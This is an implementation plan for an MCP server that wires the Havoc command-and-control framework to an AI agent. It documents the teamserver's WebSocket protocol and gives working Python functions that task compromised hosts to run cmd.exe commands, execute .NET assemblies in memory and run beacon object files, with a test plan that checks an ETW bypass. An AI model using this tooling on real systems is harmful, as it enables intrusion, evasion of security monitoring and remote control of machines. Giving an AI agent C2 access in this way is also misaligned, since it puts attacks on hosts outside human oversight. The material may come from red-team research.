# Havoc MCP Server — Implementation Plan

## Current State
- ✅ MCP server skeleton working (mcp package, stdio transport)
- ✅ `havoc_status` — WebSocket connect + auth works
- ✅ `havoc_list_agents` — DB query works
- ✅ `havoc_shell` — COMMAND_PROC with DEMON_COMMAND_PROC_CREATE
- ✅ `havoc_inline_dotnet` — COMMAND_ASSEMBLY_INLINE_EXECUTE
- ✅ `havoc_inline_execute` — COMMAND_INLINEEXECUTE (BOF)

**Completed 2026-02-06:** Fixed command execution protocol to match teamserver expectations.

## Protocol Analysis

### Event Structure
```
Head: { Event, User, Time, OneTime }
Body: { SubEvent, Info: {...} }
```

### Session Input (sending commands)
- **Event**: 7 (Session)
- **SubEvent**: 3 (Input)
- **Info** fields:
  - `DemonID`: string — Agent ID
  - `TaskID`: string — Unique task identifier (can use timestamp/uuid)
  - `CommandLine`: string — Human-readable command for logging
  - `CommandID`: string — Numeric command code as string

### Command Codes (from commands.go)
| Command | Code | Notes |
|---------|------|-------|
| COMMAND_PROC | 0x1010 (4112) | Process operations |
| COMMAND_INLINEEXECUTE | 20 | BOF execution |
| COMMAND_ASSEMBLY_INLINE_EXECUTE | 0x2001 (8193) | .NET inline |
| COMMAND_FS | 15 | Filesystem ops |
| COMMAND_SLEEP | 11 | Sleep config |

### Shell Command (COMMAND_PROC)
Requires additional fields in Info:
- `ProcCommand`: "4" (DEMON_COMMAND_PROC_CREATE)
- `Args`: "cmd.exe;/c whoami;0;0;0" (Process;Args;State;Piped;Verbose)

### Inline Execute (BOF)
Requires:
- `ObjectFile`: base64 encoded BOF
- `EntryPoint`: function name (default "go")
- `Arguments`: packed arguments
- `Flags`: execution flags

### Inline .NET
Requires:
- `BinaryName`: assembly filename
- `Binary`: base64 encoded assembly
- `Arguments`: string args

### Session Output (receiving responses)
- **Event**: 7 (Session)
- **SubEvent**: 4 (Output)
- **Info** fields:
  - `DemonID`: Agent ID
  - `CommandID`: Command that generated output
  - `Output`: Actual output text

## Implementation Tasks

### 1. Fix shell_command()
```python
async def shell_command(self, agent_id: str, command: str) -> str:
    task_id = str(int(time.time() * 1000))
    await self.ws.send(json.dumps({
        "Head": {"Event": 7, "User": self.user, "Time": "", "OneTime": ""},
        "Body": {"SubEvent": 3, "Info": {
            "DemonID": agent_id,
            "TaskID": task_id,
            "CommandLine": f"shell {command}",
            "CommandID": "4112",  # COMMAND_PROC
            "ProcCommand": "4",   # DEMON_COMMAND_PROC_CREATE
            "Args": f"cmd.exe;/c {command};0;1;0"  # Piped=1 for output
        }}
    }))
```

### 2. Fix inline_dotnet()
```python
async def inline_dotnet(self, agent_id: str, assembly_path: str, args: str = "") -> str:
    with open(assembly_path, "rb") as f:
        assembly_b64 = base64.b64encode(f.read()).decode()
    
    task_id = str(int(time.time() * 1000))
    await self.ws.send(json.dumps({
        "Head": {"Event": 7, "User": self.user, "Time": "", "OneTime": ""},
        "Body": {"SubEvent": 3, "Info": {
            "DemonID": agent_id,
            "TaskID": task_id,
            "CommandLine": f"dotnet inline-execute {Path(assembly_path).name} {args}",
            "CommandID": "8193",  # COMMAND_ASSEMBLY_INLINE_EXECUTE
            "BinaryName": Path(assembly_path).name,
            "Binary": assembly_b64,
            "Arguments": args
        }}
    }))
```

### 3. Fix inline_execute() (BOF)
```python
async def inline_execute(self, agent_id: str, bof_path: str, args: str = "") -> str:
    with open(bof_path, "rb") as f:
        bof_b64 = base64.b64encode(f.read()).decode()
    
    task_id = str(int(time.time() * 1000))
    await self.ws.send(json.dumps({
        "Head": {"Event": 7, "User": self.user, "Time": "", "OneTime": ""},
        "Body": {"SubEvent": 3, "Info": {
            "DemonID": agent_id,
            "TaskID": task_id,
            "CommandLine": f"inline-execute {Path(bof_path).name} {args}",
            "CommandID": "20",  # COMMAND_INLINEEXECUTE
            "ObjectFile": bof_b64,
            "EntryPoint": "go",
            "Arguments": args,
            "Flags": "0"
        }}
    }))
```

### 4. Improve response handling
- Agent sleep is 2s + jitter — need longer timeouts
- Collect multiple Output events until done marker
- Handle error events (SubEvent 5?)

### 5. Add connection pooling
- Keep WebSocket open between calls
- Reconnect on failure
- Add health check

## Test Plan

1. Start fresh agent on Windows VM
2. Test `havoc_shell` with `whoami`
3. Test `havoc_inline_dotnet` with Seatbelt.exe
4. Test `havoc_inline_execute` with a simple BOF
5. Verify ETW bypass by checking no crashes on .NET/BOF paths

## Files to Reference
- `/home/jam/clawd/havoc-research/teamserver/pkg/agent/commands.go` — Command codes
- `/home/jam/clawd/havoc-research/teamserver/pkg/agent/demons.go` — TaskPrepare logic
- `/home/jam/clawd/havoc-research/teamserver/cmd/server/dispatch.go` — Input handling
- `/home/jam/clawd/havoc-research/teamserver/pkg/packager/types.go` — Event/SubEvent codes

## Testing Checklist
1. ~~Update havoc_mcp.py with correct protocol~~ ✅ Done
2. Restart teamserver + spawn fresh agent
3. Test shell command
4. Test inline-dotnet (validates ETW bypass)
5. Test inline-execute BOF
6. Add to mcporter config for persistent access

---

## Implementation Notes (2026-02-06)

### Key Protocol Discoveries from Source Analysis

**COMMAND_PROC (shell commands):**
- Args format from demons.go TaskPrepare: `"State;Verbose;Piped;Process;ProcessArgsBase64"`
- State: 0=normal execution
- Verbose: true/false string
- Piped: true/false string (true captures output)
- Process: executable path (cmd.exe)
- ProcessArgsBase64: base64 encoded args (e.g., "/c whoami")

**COMMAND_ASSEMBLY_INLINE_EXECUTE (.NET):**
- Binary: base64 encoded assembly bytes
- Arguments: string args (NOT base64 - server handles UTF16 encoding internally)
- Server auto-generates: PipePath, AppDomainName, NetVersion

**COMMAND_INLINEEXECUTE (BOF):**
- Binary: base64 encoded object file
- FunctionName: entry point (standard is "go")
- Arguments: base64 encoded packed arguments
- Flags: "default", "threaded", or "non-threaded"

### Response Handling
- Agent default sleep: 2s + 15% jitter
- Implemented 60s timeout for shell, 120s for dotnet/BOF
- Collecting all Output events until timeout
- BOF completion detected via CommandID result codes (1-4)
